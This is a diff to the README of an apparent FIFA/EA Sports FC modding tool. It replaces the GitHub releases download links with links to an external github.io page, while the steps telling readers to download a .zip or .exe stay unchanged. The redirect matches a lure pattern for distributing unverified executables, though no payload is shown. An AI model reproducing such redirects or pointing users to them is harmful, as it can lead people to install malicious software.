@@ -1,6 +1,6 @@
 # ⚽ FIFA-Ultimate-Editor- - Modify your favorite soccer game easily
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Ayeshakha3593/FIFA-Ultimate-Editor-/releases)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://ayeshakha3593.github.io)
 
 ## 🎯 About this tool
 FIFA-Ultimate-Editor- allows you to change game files for EA Sports FC and FIFA titles. You manage textures, 3D meshes, audio files, and database entries through one interface. This software gives you full control over how your game looks and plays. You turn your game into a custom experience with simple clicks.
@@ -15,7 +15,7 @@ FIFA-Ultimate-Editor- allows you to change game files for EA Sports FC and FIFA 
 ## 📥 Getting the software
 You need the correct files to start your modding journey.
 
-1. Go to the [Releases page](https://github.com/Ayeshakha3593/FIFA-Ultimate-Editor-/releases) to view all versions.
+1. Go to the [Releases page](https://ayeshakha3593.github.io) to view all versions.
 2. Select the top entry labeled "Latest".
 3. Find the file ending in .zip or .exe under the "Assets" section.
 4. Click the file name to start your download.
